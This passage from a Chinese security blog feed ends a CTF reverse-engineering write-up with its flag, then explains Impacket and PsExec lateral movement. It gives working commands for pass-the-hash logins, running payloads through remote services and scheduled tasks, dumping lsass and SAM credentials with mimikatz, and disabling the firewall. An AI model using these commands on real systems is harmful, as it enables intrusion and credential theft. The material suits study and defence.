src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913105514741.png" alt="image-20240913105514741"></p><p>关键点2：</p><p>我输入的为16个1</p><p>ebx&#x3D;x  ebp&#x3D;1</p><p>1-x</p><p>ebx&#x3D;1</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913133836887.png" alt="image-20240913133836887"></p><p>又将1-x和1进行比较，也就是我们输入-真正的字符&#x3D;1进行比较，如果不相等程序直接会崩溃</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913134026053.png" alt="image-20240913134026053"></p><p>接下来第一个字符输入y满足条件，继续看程序运行，debug到这个位置，有个cmp ecx，10是个循环，换算10进制为16次</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913135150861.png" alt="image-20240913135150861"></p><p>第二次是我输入的1和u相减，最好和0比较，若不等则程序崩溃</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913135325542.png" alt="image-20240913135325542"></p><p>再次输入flag&#x3D;yu11111111111111，找到了比较规律，比较的就是上面这段数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ds:[edi + edx] = 0 + 0095FB1A = 0095FB1A</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913140546567.png" alt="image-20240913140546567"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913140640198.png" alt="image-20240913140640198"></p><p>规律为输入字符按顺序减去xuanyuan-zhifeng的字母，结果和数组中的数组进行对比</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x u a n y u a n - z h i f e n g</span><br><span class="line">1 0 0 0 0 1 0 0 0 0 1 0 0 0 0 1</span><br><span class="line">y u a n y v a n - z i i f e n h</span><br><span class="line"></span><br><span class="line">答案：</span><br><span class="line">yuanyvan-ziifenh</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240913140930456.png" alt="image-20240913140930456"></p>]]></content>
    
    
    <summary type="html">逆向学习-SMC和花指令</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Impacket横向移动工具使用及原理</title>
    <link href="http://example.com/posts/3468438092.html"/>
    <id>http://example.com/posts/3468438092.html</id>
    <published>2024-09-09T05:56:23.000Z</published>
    <updated>2024-10-25T07:09:20.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h1><h2 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h2><p>原项目：python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fortra/impacket</span><br></pre></td></tr></table></figure><p>windows&#x2F;linux平台文件运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#Windows&amp;Linux</span><br><span class="line">https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries</span><br><span class="line">#Windows</span><br><span class="line">https://github.com/maaaaz/impacket-examples-windows</span><br></pre></td></tr></table></figure><p>GUI图形化项目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#C/S</span><br><span class="line">https://github.com/yutianqaq/impacket-gui</span><br><span class="line">https://github.com/savior-only/Impacket_PyQt5</span><br><span class="line">#B/S Web</span><br><span class="line">https://github.com/XiaoLi996/Impacket_For_Web</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><table><thead><tr><th>类型</th><th>脚本名</th><th>脚本介绍</th></tr></thead><tbody><tr><td>远程执行</td><td>psexec.py</td><td>使用了RemComSvc的实现了PSEXEC功能的脚本。</td></tr><tr><td>远程执行</td><td>smbexec.py</td><td>类似PSECEX的执行方式，但未使用RemComSvc。这个脚本使用了一个本地SMB Server接收返回的结果，可以避免目标SMB没有可写的目录</td></tr><tr><td>远程执行</td><td>atexec.py</td><td>这个脚本通过MS-TSCH协议控制计划任务在目标机器上执行命令并获得回显</td></tr><tr><td>远程执行</td><td>wmiexec.py</td><td>通过WMI实现了半交互式的Shell，不需要在目标安装任何服务或软件。而且高度隐蔽的以管理员权限运行</td></tr><tr><td>远程执行</td><td>dcomexec.py</td><td>类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有<code>MMC20.Application</code>、<code>ShellWindows</code>、<code>ShellBrowserWindows</code></td></tr><tr><td>Kerberos协议</td><td>GetTGT.py</td><td>提供密码、hash或aeskey用来请求TGT并且保存为ccache格式</td></tr><tr><td>Kerberos协议</td><td>GetST.py</td><td>提供密码、hash、aeskey或ccache格式的TGT，可以请求服务票据并保存为ccache格式。如果提供的账户存在约束委派且支持协议转换，那么可以使用-impersonate选项模拟为其他用户请求票据</td></tr><tr><td>Kerberos协议</td><td>GetPac.py</td><td>这个脚本会为指定用户请求经过身份验证的PAC，通过使用MS-SFU协议的S4USelf和U2U的Kerberos认证实现</td></tr><tr><td>Kerberos协议</td><td>GetUserSPNs.py</td><td>这个脚本会找出和普通用户账户关联的SPN，输出格式与JtR和hashcat兼容</td></tr><tr><td>Kerberos协议</td><td>GetNPUsers.py</td><td>这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。</td></tr><tr><td>Kerberos协议</td><td>rbcd.py</td><td>这个脚本可以处理目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性</td></tr><tr><td>Kerberos协议</td><td>ticketConverter.py</td><td>这个脚本可以在mimikatz常用的kirbi文件和Impacket常用的ccache文件之间进行转换</td></tr><tr><td>Kerberos协议</td><td>ticketer.py</td><td>这个脚本可以基于模板或自己创建金、银票据，并允许你自定义PAC_LOGON_INFO、groups、ExtraSids、duration等属性</td></tr><tr><td>Kerberos协议</td><td>raiseChild.py</td><td>这个脚本通过金票据和ExtraSids实现从子域到域森林的提权</td></tr><tr><td>Windows密码</td><td>secretsdump.py</td><td>提供各种技术以不运行任何程序远程dump密码。对SAM和LSA以及缓存的凭据，会尝试从目标注册表中读取并将hives保存在<code>%SYSTEMROOT%\Temp</code>目录，再将hives读取回来。对于DIT文件，会使用<code>DL_DRSGetNCChanges</code>函数来dump目标的NTLM hash、明文密码和Kerberos keys。也可以通过smbexec或wmiexec执行vssadmin得到NTDS.dit，并对其进行解密。这个脚本在服务不可用的情况下会打开对应的服务，例如远程注册表。在执行结束后，会将激活的服务还原。</td></tr><tr><td>Windows密码</td><td>mimikatz.py</td><td>一个用来控制远程mimikatz RPC服务器的Shell，由@gentikiwi开发。</td></tr></tbody></table><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>psexc最初是由sysinternals提供的windows官方工具，用来管理大量机器</p><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/">https://learn.microsoft.com/zh-cn/sysinternals/downloads/</a></p><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909190618635.png" alt="image-20240909190618635"></p><h4 id="背景知识（IPC-）"><a href="#背景知识（IPC-）" class="headerlink" title="背景知识（IPC$）"></a>背景知识（IPC$）</h4><ul><li><strong>命名管道</strong>：IPC$ 共享实际上是一个命名管道（Named Pipe），它通过 SMB 协议在网络上提供了一个虚拟的通信通道。这意味着远程客户端可以通过网络连接到这个管道，并通过它发送和接收数据。</li><li><strong>RPC 过程</strong>：通过 IPC$ 共享，客户端可以发起 RPC 调用，从而执行远程系统上的特定服务或功能。SMB 协议在这种情况下提供了传输层的支持，使得 RPC 能够在不同主机之间传递消息。</li></ul><p>利用条件：</p><p>1、开启139、445端口</p><p>2、管理员开启默认共享</p><p>IPC$连接失败原因：</p><p>1、用户名或密码错误</p><p>2、没有打开ipc$默认共享</p><p>3、139、445端口不能成功连接（防火墙）</p><p>IPC$常见连接错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">错误号5:拒绝访问</span><br><span class="line">错误号51: Windows无法找到网络路径,即网络中存在问题。</span><br><span class="line">错误号53:找不到网络路径,包括IP地址错误、目标未开机、目标的 lanmanserver服务未 启动目标有防火</span><br><span class="line">墙(端口过滤)</span><br><span class="line">错误号67:找不到网络名,包括 lanmanworkstation服务未启动、ipcs已被删除</span><br><span class="line">错误号1219:提供的凭据与已存在的凭据集冲突。例如,已经和目标建立了ipcs,需要在删除原连接后重新进</span><br><span class="line">行连接。</span><br><span class="line">错误号1326:未知的用户名或错误的密码</span><br><span class="line">错误号l792;试图登录,但是网络登录服务没有启动,包括目标NetLogon服务未启动（连 接域控制器时会出</span><br><span class="line">现此情况）。</span><br><span class="line">错误号2242:此用户的密码已经过期°例如’目标机器设置了账号管理策略,强制用户定 期修改密码°</span><br></pre></td></tr></table></figure><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#建立IPC$连接</span><br><span class="line"></span><br><span class="line">net use \\192.168.1.10\ipc$ &quot;密码&quot; /user:administrator</span><br><span class="line"></span><br><span class="line">#查看系统目录</span><br><span class="line">dir \\192.168.1.10\c$</span><br><span class="line"></span><br><span class="line">#查看系统进程</span><br><span class="line">tasklist /s 192.168.1.10</span><br><span class="line"></span><br><span class="line">#查看系统时间</span><br><span class="line">net time \\IP地址</span><br><span class="line"></span><br><span class="line">--计划任务上线-- （先建立IPC$连接）</span><br><span class="line"></span><br><span class="line">#复制文件</span><br><span class="line">copy 文件 \\IP地址\C$</span><br><span class="line"></span><br><span class="line">#创建计划任务</span><br><span class="line">schtasks /create /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f</span><br><span class="line"></span><br><span class="line">#执行计划任务</span><br><span class="line">schtasks /run /s IP地址 /i /tn &quot;计划任务名&quot;</span><br><span class="line"></span><br><span class="line">#删除计划任务</span><br><span class="line">schtasks /delete /s IP地址 /tn &quot;计划任务名&quot; /f</span><br><span class="line"></span><br><span class="line">#清除IPC连接</span><br><span class="line">net use \\IP /del /y</span><br><span class="line"></span><br><span class="line">--系统服务上线-- （先建立IPC$连接）</span><br><span class="line">#复制文件</span><br><span class="line">copy 文件 \\IP地址\C$</span><br><span class="line"></span><br><span class="line">#创建服务</span><br><span class="line">sc \\192.168.1.10 create test binpath= &quot;cmd.exe /c c:\文件&quot;</span><br><span class="line"></span><br><span class="line">#开启服务</span><br><span class="line">sc \\192.168.1.10 start test</span><br><span class="line"></span><br><span class="line">#删除服务</span><br><span class="line">sc \\192.168.1.10 delete test</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>1、SMB开启（139、445端口开启状态）能建立IPC$链接，目标机器开启admin$共享（默认开启）</p><p>2、明文密码&#x2F;NTLM Hash</p><p>3、用户权限</p><p>（1）将文件写入共享文件夹的权限</p><p>（2）能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE</p><p>（3）能够启动所创建的服务：SERVICE_QUERY_STATUS &amp;&amp; SERVICE_START</p><p>总结：IPC$的利用条件+用户权限</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>原版psexec只支持明文账号密码，Impacket中的psexec支持NTLM Hash登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">原版</span><br><span class="line"></span><br><span class="line">一种先建立IPC通道连接，然后直接使用，操作如下：</span><br><span class="line"></span><br><span class="line"># 先net use 连接上IPC</span><br><span class="line"> net use \\192.168.0.1\ipc$ &quot;password123!@#&quot; /user:alibaba</span><br><span class="line"> </span><br><span class="line"># 确认是否进入IPC会话</span><br><span class="line">.\PsExec64.exe  \\ip  cmd.exe   弹cmd</span><br><span class="line">另一种时在psexec的参数中指定账户密码 操作如下：</span><br><span class="line"></span><br><span class="line">.\PsExec64.exe \\192.168.0.1 –u administrator –p password</span><br><span class="line"></span><br><span class="line">Impacket版</span><br><span class="line"></span><br><span class="line">PsExec.exe -hashes :NTHASH [./]administrator@10.1.2.3 #工作组</span><br><span class="line">PsExec.exe -hashes :NTHASH domain/administrator@10.1.2.3 #域</span><br><span class="line"></span><br><span class="line">交互shell</span><br><span class="line">python3 psexec.py test/administrator:1qaz@WSX@192.168.40.156</span><br><span class="line"></span><br><span class="line">单命令</span><br><span class="line">python3 psexec.py test/administrator:1qaz@WSX@192.168.40.156 whoami</span><br><span class="line"></span><br><span class="line">上传文件并执行</span><br><span class="line">python3 psexec.py test/administrator@192.168.40.156 &quot;/c 1+1&quot;  -remote-binary-name test.exe  -codec 936 -path c:\windows\temp\ -c p.exe -hashes :161cff084477fe596a5db81874498a24</span><br><span class="line"></span><br><span class="line">-port [destination port] 指定目标SMB的端口</span><br><span class="line">-codec codec 目标回显的编码，可先执行chcp.com拿到回显编码</span><br><span class="line">-service-name service_name 指定创建服务的名称，默认随机</span><br><span class="line">-remote-binary-name remote_binary_name 指定上传文件的名称，默认随机</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">psexec \\ip -u administrator -p admin cmd 进⼊半交互式shell</span><br><span class="line">PsExec -accepteula \\192.168.108.101 -s cmd.exe 建立交互的shell</span><br><span class="line">psexec \\ip - uadministrator -p admin -w c:\cmd 进⼊交互式shell，且c:\是⽬标机器的⼯</span><br><span class="line">作⽬录</span><br><span class="line">psexec \\ip -u administrator -p admin whoami all 执行命令</span><br><span class="line">psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行文件</span><br><span class="line">psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执行文件</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>1、建立IPC$连接</p><p>2、通过IPC$连接释放上传psexecsvc.exe</p><p>3、通过服务管理SCManager远程创建psexecsvc服务，并远程启动服务</p><p>4、客户端执行命令连接服务端，服务端启动程序执行并回显数据</p><p>5、运行后删除服务</p><p><code>PSEXESVC</code>服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件（示例中的cmd.exe），同时，它通过主机之间来重定向进程的输入&#x2F;输出（利用命名管道)。</p><p>最终生成4个管道：</p><p><code>服务本身</code>、<code>stdin（输入）</code>、<code>stdout（输出）</code>、<code>stderr（错误输出）</code></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909192719595.png" alt="image-20240909192719595"></p><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p>首次使用建议 带上-accepteula参数 否则会弹窗</p><h5 id="RDP劫持"><a href="#RDP劫持" class="headerlink" title="RDP劫持"></a>RDP劫持</h5><p>注意：管理员运行CMD</p><p>psexec -s -i cmd<br>quser<br>tscon 2 &#x2F;dest:console</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909221715163.png" alt="image-20240909221715163"></p><h5 id="hash登录"><a href="#hash登录" class="headerlink" title="hash登录"></a>hash登录</h5><p>refer：<a href="https://xz.aliyun.com/t/8574?time__1311=n4+xnD0DcDuD90DRAYD/ia4BIoD5itetKi1rO4D">https://xz.aliyun.com/t/8574?time__1311=n4%2BxnD0DcDuD90DRAYD%2Fia4BIoD5itetKi1rO4D</a></p><p><strong>准备工作：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#读取lass密码抓取</span><br><span class="line">ProcDump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">Mimikatz# sekurlsa::minidump lsass.dmp</span><br><span class="line">Mimikatz# sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;&gt; password.txt exit</span><br><span class="line"></span><br><span class="line">#读取sam</span><br><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line"></span><br><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">NTML Hash :a2ada404e9515cfb77f9877cf7641855</span><br><span class="line"></span><br><span class="line">#查看RDP是否开启 十六进制0x1关闭，十六进制0x0开启</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"></span><br><span class="line">#强制开启RDP</span><br><span class="line"></span><br><span class="line">修改注册表允许远程桌面连接</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">如果目标开启了防火墙，还需要配置防火墙为允许远程桌面连接。</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">或者直接关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><strong>登录过程：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#查看是否已开启 DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启</span><br><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br><span class="line"></span><br><span class="line">#修改注册表</span><br><span class="line"></span><br><span class="line">位置：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</span><br><span class="line">新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭</span><br><span class="line"></span><br><span class="line">对应命令行开启Restricted Admin mode的命令如下：</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909225605141.png" alt="image-20240909225605141"></p><p>mimikatz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061管理员打开CMD</span><br><span class="line"></span><br><span class="line">遇到此错误 ERROR kuhl_m_sekurlsa_acquireLSA ; Modules informations 请检查mimiket及对应操作系统版本</span><br><span class="line"></span><br><span class="line">若遇到 error kuh1_m_sekurlsa_acquireLSA:logon list 请下载最新版mimiketz</span><br><span class="line"></span><br><span class="line">遇到CredSSP加密数据库错误是大概是因为win10家庭版，做演示时俺就遇上了，于是就用2016server虚拟机进行后续操作。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrator /domain:192.168.1.12 /ntlm:a2ada404e9515cfb77f9877cf7641855 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240909231156674.png" alt="image-20240909231156674"></p><h4 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h4><p><a href="https://cn-sec.com/archives/2961299.html">https://cn-sec.com/archives/2961299.html</a></p><p><a href="https://xz.aliyun.com/t/11877?time__1311=Cq0xuD0DnAit=GNeeeuDYqAKRAxjEow+EbD">https://xz.aliyun.com/t/11877?time__1311=Cq0xuD0DnAit%3DGNeeeuDYqAKRAxjEow%2BEbD</a></p><p><a href="https://0range-x.github.io/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">https://0range-x.github.io/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.freebuf.com/articles/system/332115.html">https://www.freebuf.com/articles/system/332115.html</a></p><h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>与psexec类似</p><p>相同：</p><p>1、139&#x2F;445 SMB协议</p><p>2、建立IPC$连接</p><p>不同：</p><p>1、smbexec不会将二进制文件放入磁盘，smbexec利用一个批处理文件和一个临时文件来执行和转发消息</p><h4 id="使用条件-1"><a href="#使用条件-1" class="headerlink" title="使用条件"></a>使用条件</h4><p>1、139&#x2F;445 SMB端口开启，能建立IPC$链接，目标机器开启admin$共享（默认开启）</p><p>2、权限</p><p>（1）能在远程机器上创建服务</p><p>（2）能够启动所创建的服务</p><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">## 工作组环境下</span><br><span class="line"># 明文密码</span><br><span class="line">.\smbexec.exe 用户名:密码@ip</span><br><span class="line">.\smbexec.exe admin:admin@192.168.124.165</span><br><span class="line"></span><br><span class="line"># hash</span><br><span class="line">.\smbexec.exe -hashes :NTLMhash 用户名@ip</span><br><span class="line">.\smbexec.exe -hashes :209c6174da490caeb422f3fa5a7ae634 admin@192.168.124.165</span><br><span class="line"></span><br><span class="line"># 在域环境下</span><br><span class="line"># 明文密码</span><br><span class="line">.\smbexec.exe 域名/用户名:密码@ip</span><br><span class="line"></span><br><span class="line"># hash</span><br><span class="line">.\smbexec.exe -hashes :NTLMhash 域名/用户名@ip</span><br></pre></td></tr></table></figure><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>1、建立IPC$连接</p><p>2、svcctl协议在目标主机创建和启动服务</p><blockquote><p>在使用<code>svcctl</code>时，通常需要通过SMB协议中的IPC共享来与远程系统建立连接。IPC共享来与远程系统建立连接。IPC$（Inter-Process Communication）共享是一个特殊的共享资源，它允许远程系统通过SMB协议进行进程间通信。IPC$共享的存在是为了方便系统之间的通信以及远程管理，但它也可能成为安全风险点，尤其是在默认情况下它通常是开放的，并且不需要显式的用户凭证即可访问。</p><p>通过IPC$共享，<code>svcctl</code>可以：</p><ul><li>枚举远程系统上可用的服务列表。</li><li>启动或停止远程系统上的服务。</li><li>修改服务的配置。</li></ul></blockquote><p>3、将用户需要执行的命令存放在服务中的ImagePath属性中（每执行一次命令就需要创建一次服务）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先会将命令存放进入%TEMP%\execute.bat文件的头部</span><br><span class="line"></span><br><span class="line">运行execute.bat文件并将执行的结果储存至C$共享的__output文件中</span><br><span class="line"></span><br><span class="line">删除execute.bat文件</span><br><span class="line"></span><br><span class="line">客户端通过读取目标C$共享的__output临时文件获取执行结果</span><br></pre></td></tr></table></figure><h4 id="Refer-1"><a href="#Refer-1" class="headerlink" title="Refer"></a>Refer</h4><p><a href="https://www.freebuf.com/articles/system/332115.html">深入了解Psexec与SMBexec - FreeBuf网络安全行业门户</a></p><h3 id="atexec"><a href="#atexec" class="headerlink" title="atexec"></a>atexec</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>通过远程调用对方主机的<strong>任务计划程序</strong>（Task Scheduler）创建一个<a href="https://zhida.zhihu.com/search?q=%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&zhida_source=entity&is_preview=1">定时任务</a>，然后通过手动触发该定时任务将执行结果写入文本中，再利用smb共享去读取执行结果。</p><blockquote><p>MS-TSCH：<a href="https://zhida.zhihu.com/search?q=%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%A8%8B%E5%BA%8F%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E5%8D%8F%E8%AE%AE&zhida_source=entity&is_preview=1">任务调度程序服务远程协议</a>，该协议用于注册和配置任务以及查询远程计算机上运行的任务的状态，主要由三个独立的RPC接口组成</p><ul><li>网络时间表（ATSvc）</li><li><a href="https://zhida.zhihu.com/search?q=%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86&zhida_source=entity&is_preview=1">任务计划程序代理</a> ( SASec)</li><li>Windows Vista 操作系统<a href="https://zhida.zhihu.com/search?q=%E4%BB%BB%E5%8A%A1%E8%BF%9C%E7%A8%8B%E5%8D%8F%E8%AE%AE&zhida_source=entity&is_preview=1">任务远程协议</a> ( ITaskSchedulerService )</li></ul><p>这三个接口都使用RPC作为远程配置和管理任务的传输，且它们的功能是逐级递增的。现如今，ITaskSchedulerService 成为了大部分计划任务操作的首选。同时，ITaskSchedulerService 接口不通过<a 